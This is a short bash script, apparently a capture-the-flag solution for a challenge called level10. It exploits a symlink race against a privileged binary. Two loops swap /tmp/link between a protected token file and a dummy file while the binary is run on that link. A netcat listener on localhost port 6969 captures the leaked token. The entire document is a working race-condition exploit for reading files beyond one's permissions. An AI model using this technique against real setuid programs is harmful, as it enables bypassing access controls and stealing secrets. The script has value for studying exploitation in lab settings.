#!/bin/bash
echo -n > /tmp/link
echo -n > /tmp/file
while true; do
	ln -fs /home/user/level10/token /tmp/link
	ln -fs /tmp/file /tmp/link
done &

while true; do
	/home/user/level10/level10 /tmp/link 127.0.0.1 2>&- >&-
done &

netcat -lk localhost 6969 | grep -m 1 -v '.*( )*.'

killall level10.sh